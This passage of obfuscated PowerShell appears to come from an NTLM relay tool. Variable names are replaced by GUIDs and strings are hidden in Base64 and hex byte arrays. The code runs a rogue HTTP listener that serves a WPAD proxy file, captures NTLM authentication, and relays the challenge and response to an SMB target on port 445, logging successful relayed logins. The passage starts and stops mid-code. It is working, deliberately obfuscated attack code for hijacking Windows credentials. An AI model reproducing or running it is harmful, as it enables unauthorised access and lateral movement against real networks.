            ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_client = ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_listener.AcceptTcpClient()
	        ${79717535644a4793a7330ac2814fc350} = ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_client.GetStream() 
        }
        while (${79717535644a4793a7330ac2814fc350}.DataAvailable)
        {
            ${79717535644a4793a7330ac2814fc350}.Read(${3ef2d1c57b1042539bc7268bf5abe5ee},0,${3ef2d1c57b1042539bc7268bf5abe5ee}.Length)
        }
        ${955b892ed7df4fb89cdbcb3e1f1836e9} = [System.BitConverter]::ToString(${3ef2d1c57b1042539bc7268bf5abe5ee})
        if(${955b892ed7df4fb89cdbcb3e1f1836e9} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA3AC0ANAA1AC0ANQA0AC0AMgAwACoA'))) -or ${955b892ed7df4fb89cdbcb3e1f1836e9} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA4AC0ANAA1AC0ANAAxAC0ANAA0AC0AMgAwACoA'))) -or ${955b892ed7df4fb89cdbcb3e1f1836e9} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABmAC0ANQAwAC0ANQA0AC0ANAA5AC0ANABmAC0ANABlAC0ANQAzAC0AMgAwACoA'))))
        {
            ${0e7a9fe8f4254633b930c8d2db10e38a} = ${955b892ed7df4fb89cdbcb3e1f1836e9}.Substring(${955b892ed7df4fb89cdbcb3e1f1836e9}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAyADAALQA=')))) + 4,${955b892ed7df4fb89cdbcb3e1f1836e9}.Substring(${955b892ed7df4fb89cdbcb3e1f1836e9}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAyADAALQA=')))) + 1).IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAyADAALQA=')))) - 3)
            ${0e7a9fe8f4254633b930c8d2db10e38a} = ${0e7a9fe8f4254633b930c8d2db10e38a}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
            ${0692fe0f3fb24e1eaab3d7ebe23d6789}.request_RawUrl = New-Object System.String (${0e7a9fe8f4254633b930c8d2db10e38a},0,${0e7a9fe8f4254633b930c8d2db10e38a}.Length)
            if(${0692fe0f3fb24e1eaab3d7ebe23d6789}.request_RawUrl -eq "")
            {
                ${0692fe0f3fb24e1eaab3d7ebe23d6789}.request_RawUrl = "/"
            }
        }
        if(${955b892ed7df4fb89cdbcb3e1f1836e9} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAtADQAMQAtADcANQAtADcANAAtADYAOAAtADYARgAtADcAMgAtADYAOQAtADcAQQAtADYAMQAtADcANAAtADYAOQAtADYARgAtADYARQAtADMAQQAtADIAMAAtACoA'))))
        {
            ${61611a7eb3434bddbe7966a2507fec1d} = ${955b892ed7df4fb89cdbcb3e1f1836e9}.Substring(${955b892ed7df4fb89cdbcb3e1f1836e9}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQA0ADEALQA3ADUALQA3ADQALQA2ADgALQA2AEYALQA3ADIALQA2ADkALQA3AEEALQA2ADEALQA3ADQALQA2ADkALQA2AEYALQA2AEUALQAzAEEALQAyADAALQA=')))) + 46)
            ${61611a7eb3434bddbe7966a2507fec1d} = ${61611a7eb3434bddbe7966a2507fec1d}.Substring(0,${61611a7eb3434bddbe7966a2507fec1d}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwAEQALQAwAEEALQA=')))))
            ${61611a7eb3434bddbe7966a2507fec1d} = ${61611a7eb3434bddbe7966a2507fec1d}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
            ${d47375f9a05b455792350e273b1d7179} = New-Object System.String (${61611a7eb3434bddbe7966a2507fec1d},0,${61611a7eb3434bddbe7966a2507fec1d}.Length)
        }
        else
        {
            ${d47375f9a05b455792350e273b1d7179} =  ''
        }
        ${ef2dde5f07274d298707311575ed9927} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUAA=')))
        ${85f815ca3b8943eab9e6567a40f41375} = ""
        if (${0692fe0f3fb24e1eaab3d7ebe23d6789}.request_RawUrl -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA'))))
        {
            ${0692fe0f3fb24e1eaab3d7ebe23d6789}.response_StatusCode = 0x32,0x30,0x30
            ${a5c08e2ce5664eeaaae77c8bcc57a06d} = 0x4f,0x4b
            ${af6cf8bfbe874e848c2fa8bc55b21a87} = 0x66,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e,0x20,0x46,0x69,0x6e,0x64,0x50,0x72,
                                  0x6f,0x78,0x79,0x46,0x6f,0x72,0x55,0x52,0x4c,0x28,0x75,0x72,0x6c,0x2c,0x68,
                                  0x6f,0x73,0x74,0x29,0x7b +
                                  ${3b9c0e49cf9f4d629fdf22ba17aa1451} +
                                  0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x50,0x52,0x4f,0x58,0x59,0x20,0x31,
                                  0x32,0x37,0x2e,0x30,0x2e,0x30,0x2e,0x31,0x3a +
                                  ${f5f0632351c44148b873f95e81bea80a} +
                                  0x22,0x3b,0x7d
            ${6efafeef899c405dabd479f39fb81ce4} = ''
            ${85f815ca3b8943eab9e6567a40f41375} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBQAEEARAA=')))
        }
        elseif (${0692fe0f3fb24e1eaab3d7ebe23d6789}.request_RawUrl -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBHAEUAVABIAEEAUwBIAEUAUwA='))))
        {
            ${0692fe0f3fb24e1eaab3d7ebe23d6789}.response_StatusCode = 0x34,0x30,0x31
            ${a5c08e2ce5664eeaaae77c8bcc57a06d} = 0x4f,0x4b
            ${6efafeef899c405dabd479f39fb81ce4} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA=')))
            ${85f815ca3b8943eab9e6567a40f41375} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA=')))
        }
        else
        {
            ${0692fe0f3fb24e1eaab3d7ebe23d6789}.response_StatusCode = 0x33,0x30,0x32
            ${48ae0566dbbc41ba99cbd338a8bd6726} = 0x43,0x61,0x63,0x68,0x65,0x2d,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x3a,0x20,0x70,0x72,
                             0x69,0x76,0x61,0x74,0x65,0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,
                             0x70,0x65,0x3a,0x20,0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,0x6c,0x3b,0x20,0x63,0x68,
                             0x61,0x72,0x73,0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,0x0d,0x0a,0x45,0x78,0x70,0x69,
                             0x72,0x65,0x73,0x3a,0x20,0x4d,0x6f,0x6e,0x2c,0x20,0x30,0x31,0x20,0x4a,0x61,0x6e,0x20,
                             0x30,0x30,0x30,0x31,0x20,0x30,0x30,0x3a,0x30,0x30,0x3a,0x30,0x30,0x20,0x47,0x4d,0x54,
                             0x0d,0x0a,0x4c,0x6f,0x63,0x61,0x74,0x69,0x6f,0x6e,0x3a,0x20,0x68,0x74,0x74,0x70,0x3a,
                             0x2f,0x2f,0x6c,0x6f,0x63,0x61,0x6c,0x68,0x6f,0x73,0x74,0x3a +
                             ${34258eb257cf43f3ac1c9108abfc161e} +
                             0x2f,0x47,0x45,0x54,0x48,0x41,0x53,0x48,0x45,0x53,0x0d,0x0a
            ${a5c08e2ce5664eeaaae77c8bcc57a06d} = 0x4f,0x4b
            ${6efafeef899c405dabd479f39fb81ce4} = ''
            ${85f815ca3b8943eab9e6567a40f41375} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGQAaQByAGUAYwB0AA==')))
            if(${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_client_handle_old -ne ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_client.Client.Handle)
            {
                ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Attempting to redirect to http://localhost:" + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABIAFQAVABQAFAAbwByAHQALwBnAGUAdABoAGEAcwBoAGUAcwAgAGEAbgBkACAAdAByAGkAZwBnAGUAcgAgAHIAZQBsAGEAeQA='))))
            }
        }
        if((${0692fe0f3fb24e1eaab3d7ebe23d6789}.request_RawUrl_old -ne ${0692fe0f3fb24e1eaab3d7ebe23d6789}.request_RawUrl -and ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_client_handle_old -ne ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_client.Client.Handle) -or ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_client_handle_old -ne ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_client.Client.Handle)
        {
            ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - ${ef2dde5f07274d298707311575ed9927} request for " + ${0692fe0f3fb24e1eaab3d7ebe23d6789}.request_RawUrl + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAByAGUAYwBlAGkAdgBlAGQAIABmAHIAbwBtACAA'))) + ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_client.Client.RemoteEndpoint.Address)
        }
        if(${d47375f9a05b455792350e273b1d7179}.StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA==')))))
        {
            ${d47375f9a05b455792350e273b1d7179} = ${d47375f9a05b455792350e273b1d7179} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA=='))),''
            [byte[]] ${c4394dc631b049e599bb2eddbecb2fdc} = [System.Convert]::FromBase64String(${d47375f9a05b455792350e273b1d7179})
            ${0692fe0f3fb24e1eaab3d7ebe23d6789}.response_StatusCode = 0x34,0x30,0x31
            ${a5c08e2ce5664eeaaae77c8bcc57a06d} = 0x4f,0x4b
            if (${c4394dc631b049e599bb2eddbecb2fdc}[8] -eq 1)
            {
                if(${0692fe0f3fb24e1eaab3d7ebe23d6789}.SMB_relay_active_step -eq 0)
                {
                    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.SMB_relay_active_step = 1
                    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - ${ef2dde5f07274d298707311575ed9927} to SMB relay triggered by " + ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_client.Client.RemoteEndpoint.Address)
                    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Grabbing challenge for relay from " + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADQAYQBkAGUANgBlAGMAYgAwADUANwBhADQAOQA2ADMAYgBhADAAMwAzAGUANAAzADQANAA1ADgAZgBiADUAMwB9AA=='))))
                    ${c47b7e6f72f84caa846eae38219512af} = New-Object System.Net.Sockets.TCPClient
                    ${c47b7e6f72f84caa846eae38219512af}.connect(${4ade6ecb057a4963ba033e434458fb53},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA0ADUA'))))
                    if(!${c47b7e6f72f84caa846eae38219512af}.connected)
                    {
                        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - SMB relay target is not responding")
                        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.SMB_relay_active_step = 0
                    }
                    if(${0692fe0f3fb24e1eaab3d7ebe23d6789}.SMB_relay_active_step -eq 1)
                    {
                        ${e45fb53024904d8ab7d37ce46d01033a} = ee786c187dbe4af7b0139692d11b7e60 ${c47b7e6f72f84caa846eae38219512af} ${c4394dc631b049e599bb2eddbecb2fdc}
                        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.SMB_relay_active_step = 2
                        ${e45fb53024904d8ab7d37ce46d01033a} = ${e45fb53024904d8ab7d37ce46d01033a}[2..${e45fb53024904d8ab7d37ce46d01033a}.Length]
                        ${d4fc511a0ea649629576cc7af60e82cd} = ${e45fb53024904d8ab7d37ce46d01033a}[34..33]
                        ${61cbe6d2a0f84c32b21cbe1a092eeffe} = [System.BitConverter]::ToString(${e45fb53024904d8ab7d37ce46d01033a})
                        ${61cbe6d2a0f84c32b21cbe1a092eeffe} = ${61cbe6d2a0f84c32b21cbe1a092eeffe} -replace "-",""
                        ${b16f36a265d941aeb236dff11f7b1af7} = ${61cbe6d2a0f84c32b21cbe1a092eeffe}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABFADUANAA0AEMANABEADUAMwA1ADMANQAwADAAMAA='))))
                        ${db219187c23549dfb19dc7f0623c331a} = ${b16f36a265d941aeb236dff11f7b1af7} / 2
                        ${624e4c0ab2b0458995dc9caa04585931} = e4d2a1c6425b46fd910b818fb7433f18 (${db219187c23549dfb19dc7f0623c331a} + 12) ${e45fb53024904d8ab7d37ce46d01033a}
                        ${5bfbb3b4c15b4391b9f825a13d5d0f1f} = ${e45fb53024904d8ab7d37ce46d01033a}[(${db219187c23549dfb19dc7f0623c331a} + 12)..(${db219187c23549dfb19dc7f0623c331a} + 19)]
                        ${24229848498f474d9e668435e6cd6810} = e4d2a1c6425b46fd910b818fb7433f18 (${db219187c23549dfb19dc7f0623c331a} + 40) ${e45fb53024904d8ab7d37ce46d01033a}
                        ${f83c8cf032ee4871986d614734c12248} = ${e45fb53024904d8ab7d37ce46d01033a}[(${db219187c23549dfb19dc7f0623c331a} + 40)..(${db219187c23549dfb19dc7f0623c331a} + 55 + ${624e4c0ab2b0458995dc9caa04585931})]
                        ${072694a097a340c0926d4b9893749f67} = ${e45fb53024904d8ab7d37ce46d01033a}[(${db219187c23549dfb19dc7f0623c331a} + 24)..(${db219187c23549dfb19dc7f0623c331a} + 31)]
                        ${08890082e6504e199ba27d8d33a89e2f} = ${e45fb53024904d8ab7d37ce46d01033a}[(${db219187c23549dfb19dc7f0623c331a} + 32)..(${db219187c23549dfb19dc7f0623c331a} + 39)]
                        ${6963f56b60cd4278bf566568a3f22103} = ${e45fb53024904d8ab7d37ce46d01033a}[(${db219187c23549dfb19dc7f0623c331a} + 56 + ${624e4c0ab2b0458995dc9caa04585931})..(${db219187c23549dfb19dc7f0623c331a} + 55 + ${624e4c0ab2b0458995dc9caa04585931} + ${24229848498f474d9e668435e6cd6810})]
                        ${3022cf89022e48e4b2abbbbbc2e90df3} = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +
                                           ${5bfbb3b4c15b4391b9f825a13d5d0f1f} +
                                           0x05,0xc2,0x89,0xa2 +
                                           ${072694a097a340c0926d4b9893749f67} +
                                           ${08890082e6504e199ba27d8d33a89e2f} +
                                           ${f83c8cf032ee4871986d614734c12248} +
                                           ${6963f56b60cd4278bf566568a3f22103}
                        ${dc93213473994c2985303b888218f68b} = [System.Convert]::ToBase64String(${3022cf89022e48e4b2abbbbbc2e90df3})
                        ${6efafeef899c405dabd479f39fb81ce4} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA=='))) + ${dc93213473994c2985303b888218f68b}
                        ${f78220a4f00b411f804d5d237d582aeb} = a567d2bbb16849b98af24108e0faf73d ${e45fb53024904d8ab7d37ce46d01033a}
                        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_challenge_queue.Add(${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_client.Client.RemoteEndpoint.Address.IPAddressToString + ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_client.Client.RemoteEndpoint.Port + ',' + ${f78220a4f00b411f804d5d237d582aeb})
                        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Received challenge ${f78220a4f00b411f804d5d237d582aeb} " + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBvAHIAIAByAGUAbABhAHkAIABmAHIAbwBtACAAJAB7ADQAYQBkAGUANgBlAGMAYgAwADUANwBhADQAOQA2ADMAYgBhADAAMwAzAGUANAAzADQANAA1ADgAZgBiADUAMwB9AA=='))))
                        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Providing challenge " + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AGYANwA4ADIAMgAwAGEANABmADAAMABiADQAMQAxAGYAOAAwADQAZAA1AGQAMgAzADcAZAA1ADgAMgBhAGUAYgB9ACAAZgBvAHIAIAByAGUAbABhAHkAIAB0AG8AIAA='))) + ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_client.Client.RemoteEndpoint.Address)
                        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.SMB_relay_active_step = 3
                    }
                    else
                    {
                        ${6efafeef899c405dabd479f39fb81ce4} = e97ebf2d2cb04bb1a483226a4f699e33
                    }
                }
                else
                {
                     ${6efafeef899c405dabd479f39fb81ce4} = e97ebf2d2cb04bb1a483226a4f699e33
                }
                ${0692fe0f3fb24e1eaab3d7ebe23d6789}.response_StatusCode = 0x34,0x30,0x31
                ${a5c08e2ce5664eeaaae77c8bcc57a06d} = 0x4f,0x4b
            }
            elseif (${c4394dc631b049e599bb2eddbecb2fdc}[8] -eq 3)
            {
                ${6efafeef899c405dabd479f39fb81ce4} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA=')))
                ${d90cde9d01a9448a91c8b8f2de18bb83} = ${c4394dc631b049e599bb2eddbecb2fdc}[24]
                ${251d886a1bda4584a918a44cd71e2615} = e4d2a1c6425b46fd910b818fb7433f18 22 ${c4394dc631b049e599bb2eddbecb2fdc}
                ${9513db0fc2de4919ac4b174d2e1e6e35} = e4d2a1c6425b46fd910b818fb7433f18 28 ${c4394dc631b049e599bb2eddbecb2fdc}
                ${d69286a39abe41e78dc0205b918e0cfe} = e4d2a1c6425b46fd910b818fb7433f18 32 ${c4394dc631b049e599bb2eddbecb2fdc}
                if(${9513db0fc2de4919ac4b174d2e1e6e35} -eq 0)
                {
                    ${249913aa82a043239a9f2ba571b40e5e} = ''
                }
                else
                {  
                    ${249913aa82a043239a9f2ba571b40e5e} = e9d05119cba84ff1affb6dd8f3f666b8 ${9513db0fc2de4919ac4b174d2e1e6e35} 0 0 ${d69286a39abe41e78dc0205b918e0cfe} ${c4394dc631b049e599bb2eddbecb2fdc}
                }
                ${32f4ad83de2149098f780d39a91b8f29} = e4d2a1c6425b46fd910b818fb7433f18 36 ${c4394dc631b049e599bb2eddbecb2fdc}
                ${68b6aa6dab5e4149bcb88028e36ccbcc} = e4d2a1c6425b46fd910b818fb7433f18 44 ${c4394dc631b049e599bb2eddbecb2fdc}
                if ([System.BitConverter]::ToString(${c4394dc631b049e599bb2eddbecb2fdc}[16]) -eq '58' -and [System.BitConverter]::ToString(${c4394dc631b049e599bb2eddbecb2fdc}[24]) -eq '58' -and [System.BitConverter]::ToString(${c4394dc631b049e599bb2eddbecb2fdc}[32]) -eq '58')
                {
                    ${1eee3b50a46b47a1ac322104795685ae} = ''
                    ${cd73f840c6ce4bf9a43471c057aef427} = ''
                }
                else
                {
                    ${1eee3b50a46b47a1ac322104795685ae} = e9d05119cba84ff1affb6dd8f3f666b8 ${32f4ad83de2149098f780d39a91b8f29} ${9513db0fc2de4919ac4b174d2e1e6e35} 0 ${d69286a39abe41e78dc0205b918e0cfe} ${c4394dc631b049e599bb2eddbecb2fdc}
                    ${cd73f840c6ce4bf9a43471c057aef427} = e9d05119cba84ff1affb6dd8f3f666b8 ${68b6aa6dab5e4149bcb88028e36ccbcc} ${9513db0fc2de4919ac4b174d2e1e6e35} ${32f4ad83de2149098f780d39a91b8f29} ${d69286a39abe41e78dc0205b918e0cfe} ${c4394dc631b049e599bb2eddbecb2fdc}
                }
                ${a82a62fd99db410c8f89600d10cb90b1} = [System.BitConverter]::ToString(${c4394dc631b049e599bb2eddbecb2fdc}[${d90cde9d01a9448a91c8b8f2de18bb83}..(${d90cde9d01a9448a91c8b8f2de18bb83} + ${251d886a1bda4584a918a44cd71e2615})]) -replace "-",""
                ${a82a62fd99db410c8f89600d10cb90b1} = ${a82a62fd99db410c8f89600d10cb90b1}.Insert(32,':')
                ${0692fe0f3fb24e1eaab3d7ebe23d6789}.response_StatusCode = 0x32,0x30,0x30
                ${a5c08e2ce5664eeaaae77c8bcc57a06d} = 0x4f,0x4b
                ${f78220a4f00b411f804d5d237d582aeb} = ''
                if (${0692fe0f3fb24e1eaab3d7ebe23d6789}.SMB_relay_active_step -eq 3)
                {
                    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Sending response for " + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADIANAA5ADkAMQAzAGEAYQA4ADIAYQAwADQAMwAyADMAOQBhADkAZgAyAGIAYQA1ADcAMQBiADQAMABlADUAZQB9AFwAJAB7ADEAZQBlAGUAMwBiADUAMABhADQANgBiADQANwBhADEAYQBjADMAMgAyADEAMAA0ADcAOQA1ADYAOAA1AGEAZQB9ACAAZgBvAHIAIAByAGUAbABhAHkAIAB0AG8AIAA='))) + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADQAYQBkAGUANgBlAGMAYgAwADUANwBhADQAOQA2ADMAYgBhADAAMwAzAGUANAAzADQANAA1ADgAZgBiADUAMwB9AA=='))))
                    ${87a41c96eec24fc89f3fe77c8ae2de5e} = c8f266b73c21452e94ce336d0337db39 ${c47b7e6f72f84caa846eae38219512af} ${c4394dc631b049e599bb2eddbecb2fdc} ${d4fc511a0ea649629576cc7af60e82cd}
                    ${87a41c96eec24fc89f3fe77c8ae2de5e} = ${87a41c96eec24fc89f3fe77c8ae2de5e}[1..${87a41c96eec24fc89f3fe77c8ae2de5e}.Length]
                    if(!${76bba80cf42c4a2e9c0c4de90e4b4df9} -and [System.BitConverter]::ToString(${87a41c96eec24fc89f3fe77c8ae2de5e}[9..12]) -eq ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA==')))))
                    {
                        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - ${ef2dde5f07274d298707311575ed9927} to SMB relay " + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACAAcwB1AGMAYwBlAHMAcwBmAHUAbAAgAGYAbwByACAAJAB7ADIANAA5ADkAMQAzAGEAYQA4ADIAYQAwADQAMwAyADMAOQBhADkAZgAyAGIAYQA1ADcAMQBiADQAMABlADUAZQB9AFwA'))) + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAZQBlAGUAMwBiADUAMABhADQANgBiADQANwBhADEAYQBjADMAMgAyADEAMAA0ADcAOQA1ADYAOAA1AGEAZQB9ACAAbwBuACAAJAB7ADQAYQBkAGUANgBlAGMAYgAwADUANwBhADQAOQA2ADMAYgBhADAAMwAzAGUANAAzADQANAA1ADgAZgBiADUAMwB9AA=='))))
                        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.SMB_relay_active_step = 4
                        a8badc65df47466dbd149e72dd51242c ${c47b7e6f72f84caa846eae38219512af} ${d4fc511a0ea649629576cc7af60e82cd}          
                    }
                    else
                    {
                        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - ${ef2dde5f07274d298707311575ed9927} to SMB relay " + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACAAZgBhAGkAbABlAGQAIABmAG8AcgAgACQAewAyADQAOQA5ADEAMwBhAGEAOAAyAGEAMAA0ADMAMgAzADkAYQA5AGYAMgBiAGEANQA3ADEAYgA0ADAAZQA1AGUAfQBcAA=='))) + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAZQBlAGUAMwBiADUAMABhADQANgBiADQANwBhADEAYQBjADMAMgAyADEAMAA0ADcAOQA1ADYAOAA1AGEAZQB9ACAAbwBuACAAJAB7ADQAYQBkAGUANgBlAGMAYgAwADUANwBhADQAOQA2ADMAYgBhADAAMwAzAGUANAAzADQANAA1ADgAZgBiADUAMwB9AA=='))))
                        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.SMB_relay_active_step = 0
                        ${c47b7e6f72f84caa846eae38219512af}.Close()
                    }
                }
            }
            else
            {
                ${6efafeef899c405dabd479f39fb81ce4} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA=')))
            }
        }
        ${c0187c7ad61a4726b71732e5924a2603} = Get-Date -format r
        ${c0187c7ad61a4726b71732e5924a2603} = [System.Text.Encoding]::UTF8.GetBytes(${c0187c7ad61a4726b71732e5924a2603})
        ${84b27e92e86c439385ec43f4b68aba56} = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,
                                        0x74,0x65,0x3a,0x20
        if(${6efafeef899c405dabd479f39fb81ce4})
        {
            ${6efafeef899c405dabd479f39fb81ce4} = [System.Text.Encoding]::UTF8.GetBytes(${6efafeef899c405dabd479f39fb81ce4})
            ${b5da3192b8fc4a15ac35b3d46a2b0161} = 0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20 +
                             ${0692fe0f3fb24e1eaab3d7ebe23d6789}.response_StatusCode +
                             0x20 +
                             ${a5c08e2ce5664eeaaae77c8bcc57a06d} +
                             0x0d,0x0a,0x43,0x61,0x63,0x68,0x65,0x2d,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x3a,
                             0x20,0x70,0x72,0x69,0x76,0x61,0x74,0x65,0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,
                             0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20,0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,
                             0x6c,0x3b,0x20,0x63,0x68,0x61,0x72,0x73,0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,
                             0x0d,0x0a,0x45,0x78,0x70,0x69,0x72,0x65,0x73,0x3a,0x20,0x4d,0x6f,0x6e,0x2c,0x20,
                             0x30,0x31,0x20,0x4a,0x61,0x6e,0x20,0x30,0x30,0x30,0x31,0x20,0x30,0x30,0x3a,0x30,
                             0x30,0x3a,0x30,0x30,0x20,0x47,0x4d,0x54,0x0d,0x0a +
                             ${84b27e92e86c439385ec43f4b68aba56} +
                             ${6efafeef899c405dabd479f39fb81ce4} +
                             0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,
                             0x3a,0x20,0x30,0x0d,0x0a,0x0d,0x0a
        }
        elseif(${85f815ca3b8943eab9e6567a40f41375} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBQAEEARAA='))))
        {
            ${b5da3192b8fc4a15ac35b3d46a2b0161} = 0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20 +
                             ${0692fe0f3fb24e1eaab3d7ebe23d6789}.response_StatusCode +
                             0x20 +
                             ${a5c08e2ce5664eeaaae77c8bcc57a06d} +
                             0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20,
                             0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,0x6c,0x3b,0x20,0x63,0x68,0x61,0x72,0x73,
                             0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,
                             0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20 +
                             ${2470f9be8e264d7d846b087ef9b50ab9} +
                             0x0d,0x0a,0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,
                             0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,
                             0x0a,0x44,0x61,0x74,0x65,0x3a +
                             ${c0187c7ad61a4726b71732e5924a2603} +
                             0x0d,0x0a,0x0d,0x0a +
                             ${af6cf8bfbe874e848c2fa8bc55b21a87} 
        }
        elseif(${85f815ca3b8943eab9e6567a40f41375} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGQAaQByAGUAYwB0AA=='))))
        {
            ${b5da3192b8fc4a15ac35b3d46a2b0161} = 0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20 +
                             ${0692fe0f3fb24e1eaab3d7ebe23d6789}.response_StatusCode +
                             0x20 +
                             ${a5c08e2ce5664eeaaae77c8bcc57a06d} +
